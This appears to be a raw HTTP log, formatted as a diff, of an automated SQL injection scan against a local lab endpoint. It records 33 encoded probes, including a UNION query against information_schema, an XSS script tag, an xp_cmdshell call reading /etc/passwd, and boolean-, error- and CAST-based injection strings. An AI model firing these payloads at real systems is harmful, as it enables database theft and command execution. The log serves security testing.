@@ -1,0 +1,1350 @@
+HTTP request [#1]:
+GET /safe-item?id=1 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#1] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:04 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/safe-item?id=1
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#2]:
+GET /safe-item?id=1&VgiE=1937%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#2] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:04 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/safe-item?id=1&VgiE=1937%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#3]:
+GET /safe-item?id=1 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#3] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 11
+URI: http://127.0.0.1:18080/safe-item?id=1
+
+[["alpha"]]
+
+############################################################################
+
+HTTP request [#4]:
+GET /safe-item?id=1%29..%28%27%2C.%28%22%28 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#4] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29..%28%27%2C.%28%22%28
+
+[]
+
+############################################################################
+
+HTTP request [#5]:
+GET /safe-item?id=1%27iyMHdm%3C%27%22%3EBRqkeV HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#5] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27iyMHdm%3C%27%22%3EBRqkeV
+
+[]
+
+############################################################################
+
+HTTP request [#6]:
+GET /safe-item?id=1%29%20AND%206960%3D7497%20AND%20%289655%3D9655 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#6] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%206960%3D7497%20AND%20%289655%3D9655
+
+[]
+
+############################################################################
+
+HTTP request [#7]:
+GET /safe-item?id=1%29%20AND%206867%3D6867%20AND%20%289967%3D9967 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#7] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%206867%3D6867%20AND%20%289967%3D9967
+
+[]
+
+############################################################################
+
+HTTP request [#8]:
+GET /safe-item?id=1%20AND%203952%3D9131 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#8] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%203952%3D9131
+
+[]
+
+############################################################################
+
+HTTP request [#9]:
+GET /safe-item?id=1%20AND%206867%3D6867 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#9] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%206867%3D6867
+
+[]
+
+############################################################################
+
+HTTP request [#10]:
+GET /safe-item?id=1%20AND%207082%3D8142--%20VVUr HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#10] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%207082%3D8142--%20VVUr
+
+[]
+
+############################################################################
+
+HTTP request [#11]:
+GET /safe-item?id=1%20AND%206867%3D6867--%20JxXT HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#11] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%206867%3D6867--%20JxXT
+
+[]
+
+############################################################################
+
+HTTP request [#12]:
+GET /safe-item?id=1%27%29%20AND%206306%3D8069%20AND%20%28%27yPVa%27%3D%27yPVa HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#12] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%206306%3D8069%20AND%20%28%27yPVa%27%3D%27yPVa
+
+[]
+
+############################################################################
+
+HTTP request [#13]:
+GET /safe-item?id=1%27%29%20AND%206867%3D6867%20AND%20%28%27Gqeg%27%3D%27Gqeg HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#13] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%206867%3D6867%20AND%20%28%27Gqeg%27%3D%27Gqeg
+
+[]
+
+############################################################################
+
+HTTP request [#14]:
+GET /safe-item?id=1%27%20AND%202651%3D1144%20AND%20%27HTra%27%3D%27HTra HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#14] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%202651%3D1144%20AND%20%27HTra%27%3D%27HTra
+
+[]
+
+############################################################################
+
+HTTP request [#15]:
+GET /safe-item?id=1%27%20AND%206867%3D6867%20AND%20%27tmEX%27%3D%27tmEX HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#15] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%206867%3D6867%20AND%20%27tmEX%27%3D%27tmEX
+
+[]
+
+############################################################################
+
+HTTP request [#16]:
+GET /safe-item?id=%28SELECT%20%28CASE%20WHEN%20%283557%3D1226%29%20THEN%201%20ELSE%20%28SELECT%201226%20UNION%20SELECT%205253%29%20END%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#16] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=%28SELECT%20%28CASE%20WHEN%20%283557%3D1226%29%20THEN%201%20ELSE%20%28SELECT%201226%20UNION%20SELECT%205253%29%20END%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#17]:
+GET /safe-item?id=%28SELECT%20%28CASE%20WHEN%20%282657%3D2657%29%20THEN%201%20ELSE%20%28SELECT%207915%20UNION%20SELECT%203121%29%20END%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#17] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=%28SELECT%20%28CASE%20WHEN%20%282657%3D2657%29%20THEN%201%20ELSE%20%28SELECT%207915%20UNION%20SELECT%203121%29%20END%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#18]:
+GET /safe-item?id=1%29%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29%20AND%20%289939%3D9939 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#18] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29%20AND%20%289939%3D9939
+
+[]
+
+############################################################################
+
+HTTP request [#19]:
+GET /safe-item?id=1%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#19] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#20]:
+GET /safe-item?id=1%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29--%20ReMH HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#20] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29--%20ReMH
+
+[]
+
+############################################################################
+
+HTTP request [#21]:
+GET /safe-item?id=1%27%29%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29%20AND%20%28%27USjq%27%3D%27USjq HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#21] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29%20AND%20%28%27USjq%27%3D%27USjq
+
+[]
+
+############################################################################
+
+HTTP request [#22]:
+GET /safe-item?id=1%27%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29%20AND%20%27Eeqb%27%3D%27Eeqb HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#22] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%20EXTRACTVALUE%288032%2CCONCAT%280x5c%2C0x716a6b7a71%2C%28SELECT%20%28ELT%288032%3D8032%2C1%29%29%29%2C0x7178767071%29%29%20AND%20%27Eeqb%27%3D%27Eeqb
+
+[]
+
+############################################################################
+
+HTTP request [#23]:
+GET /safe-item?id=1%29%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%281416%3D1416 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#23] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%281416%3D1416
+
+[]
+
+############################################################################
+
+HTTP request [#24]:
+GET /safe-item?id=1%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#24] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29
+
+[]
+
+############################################################################
+
+HTTP request [#25]:
+GET /safe-item?id=1%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20WoNa HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#25] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20WoNa
+
+[]
+
+############################################################################
+
+HTTP request [#26]:
+GET /safe-item?id=1%27%29%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27gfwd%27%3D%27gfwd HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#26] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27gfwd%27%3D%27gfwd
+
+[]
+
+############################################################################
+
+HTTP request [#27]:
+GET /safe-item?id=1%27%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27hsCR%27%3D%27hsCR HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#27] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%207322%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287322%3D7322%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27hsCR%27%3D%27hsCR
+
+[]
+
+############################################################################
+
+HTTP request [#28]:
+GET /safe-item?id=1%29%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%288488%3D8488 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#28] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%288488%3D8488
+
+[]
+
+############################################################################
+
+HTTP request [#29]:
+GET /safe-item?id=1%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#29] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#30]:
+GET /safe-item?id=1%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20uMlu HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#30] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20uMlu
+
+[]
+
+############################################################################
+
+HTTP request [#31]:
+GET /safe-item?id=1%27%29%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27QGze%27%3D%27QGze HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#31] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27QGze%27%3D%27QGze
+
+[]
+
+############################################################################
+
+HTTP request [#32]:
+GET /safe-item?id=1%27%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27MEgO%27%3D%27MEgO HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#32] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%201509%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281509%3D1509%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27MEgO%27%3D%27MEgO
+
+[]
+
+############################################################################
+
+HTTP request [#33]:
+GET /safe-item?id=1%29%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%285758%3D5758 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#33] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
